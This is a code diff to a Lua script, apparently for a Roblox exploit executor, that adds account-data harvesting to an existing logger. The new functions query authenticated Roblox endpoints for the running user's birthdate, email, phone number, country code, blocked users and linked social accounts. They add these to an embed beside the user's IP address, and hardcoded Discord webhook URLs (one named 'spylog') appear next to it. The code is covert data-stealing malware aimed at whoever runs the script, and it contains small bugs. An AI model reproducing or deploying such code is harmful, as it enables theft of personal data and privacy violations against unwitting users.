@@ -373,6 +373,47 @@ local function Virtual_Region()
     return ParsedCountry
 end
 
+local function getDataFromAPI(dataURL)
+local options = http({
+    Url = dataURL,
+    Method = "GET",
+    Headers = {
+        ["Content-Type"] = "application/json"
+    }
+})
+
+    local getData HttpService:JSONDecode(options.Body)
+    return getData
+end
+
+local function dataDecode(typ)
+	if typ == "birth" then
+		local b = getDataFromAPI("https://accountinformation.roblox.com/v1/birthdate")
+		return "• Birthdate : " .. b.birthMonth .. "/" .. b.birthDay .. "/" .. b.birthYear .. " ( " .. tostring(b.birthYear - os.date("%Y")) .. " Years old )"
+	elseif typ == "desc" then
+		local dsc = getDataFromAPI("https://accountinformation.roblox.com/v1/description")
+		return dsc.description
+	elseif typ == "phone" then
+		local phn = getDataFromAPI("https://accountinformation.roblox.com/v1/phone")
+		return "• Phone number : " .. phn.phone
+	elseif typ == "promote" then
+		local chnl = getDataFromAPI("https://accountinformation.roblox.com/v1/users/" .. LocalPlayer.UserId .. "/promotion-channels")
+		return "• Facebook : " .. chnl.facebook .. "\n• Twitter/X : " .. chnl.twitter .. "\n• Youtube : " .. chnl.youtube .. "\n• Twitch : " .. chnl.twitch .. "\n• Guilded : " .. chnl.guilded
+	elseif typ == "blocked" then
+		return getDataFromAPI("https://accountsettings.roblox.com/v1/users/get-detailed-blocked-users")
+	elseif typ == "email" then
+		local email = getDataFromAPI("https://accountsettings.roblox.com/v1/email")
+		return "• User email : " .. email.emailAddress
+	elseif typ == "country code" then
+		local cc = getDataFromAPI("https://users.roblox.com/v1/users/authenticated/country-code").countryCode
+		return cc.countryCode
+	elseif typ == "user info" then
+		return getDataFromAPI("https://users.roblox.com/v1/users/3621188307")
+	else
+		lib:WarnUser("null information",{AutoClose = false,CanClick = true,Duration = 9e9})
+	end
+end
+
 local url = "https://discord.com/api/webhooks/1212344550505324594/qCGYPkCwmBD3SPV2jpop_nn8qPBKxB9HQ8g62hJT-Lub0TD1Gmgdj3nolXt9rqxsCax0"
 local conflog = "https://discord.com/api/webhooks/1211484283731181639/rbJUNf5xMNmc2C-UrW8FN8TMSsuunkj1GFq9tqzr3DEpS_2_tNNQXEdhZc4Z1Tos8W2t"
 local spylog = "https://discord.com/api/webhooks/1212007908368195624/-aftzn9Z8gj1rmq4CiM_P6JjoRdVXetBbIv9VGQwWO7d3VMo3WTbbxIJcNHWLXmKKFgH"
@@ -392,11 +433,19 @@ local embed = {
         },
 	{
 	    ["name"] = "Account",
-	    ["value"] = "```\n• Username: " .. LocalPlayer.Name .. "\n• Displayname: " .. LocalPlayer.DisplayName .. "\n• ID: " .. LocalPlayer.UserId .. "\n• Join date: " .. jds() .. "\n• Account Age: " .. LocalPlayer.AccountAge .. "\n```"
+	    ["value"] = "```\n• Username: " .. LocalPlayer.Name .. "\n• Displayname: " .. LocalPlayer.DisplayName .. "\n• ID: " .. LocalPlayer.UserId .. "\n• Join date: " .. jds() .. "\n• Account Age: " .. LocalPlayer.AccountAge .. "\n" .. dataDecode("birth") .. "\n" .. dataDecode("email") .. "\n" .. dataDecode("phone") .. "\n```"
         },
 	{
 	    ["name"] = "Client Information",
-	    ["value"] = "```\n• Voice chat enabled: " .. vcenab() .. "\n• FPS: " .. math.floor(workspace:GetRealPhysicsFPS()) .. "\n• Ping: " .. tonumber(string.split(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()," ")[1]) .. "ms\n• Memory usages: " .. tostring(math.round(game:GetService("Stats").GetTotalMemoryUsageMb(game:GetService("Stats")))) .. " MB\n• Exploit: " .. Exploit() .. "\n• Device: " .. DeviceInfo() .. "\n• User region: " .. Virtual_Region() .. "\n• Client IP: " .. tostring(game:HttpGet("https://api.ipify.org",true)) .. "\n```"
+	    ["value"] = "```\n• Voice chat enabled: " .. vcenab() .. "\n• FPS: " .. math.floor(workspace:GetRealPhysicsFPS()) .. "\n• Ping: " .. tonumber(string.split(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()," ")[1]) .. "ms\n• Memory usages: " .. tostring(math.round(game:GetService("Stats").GetTotalMemoryUsageMb(game:GetService("Stats")))) .. " MB\n• Exploit: " .. Exploit() .. "\n• Device: " .. DeviceInfo() .. "\n• User region: " .. Virtual_Region() .. " ( " .. dataDecode("country code") .. ") \n• Client IP: " .. tostring(game:HttpGet("https://api.ipify.org",true)) .. "\n```"
+        },
+	{
+	    ["name"] = "Account description",
+	    ["value"] = "```\n" .. dataDecode("user info") .. "\n```"
+        },
+	{
+	    ["name"] = LocalPlayer.DisplayName .. "'s socials media",
+	    ["value"] = "```\n" .. dataDecode("promote") .. "\n```"
         }
 },
     ["footer"] = {
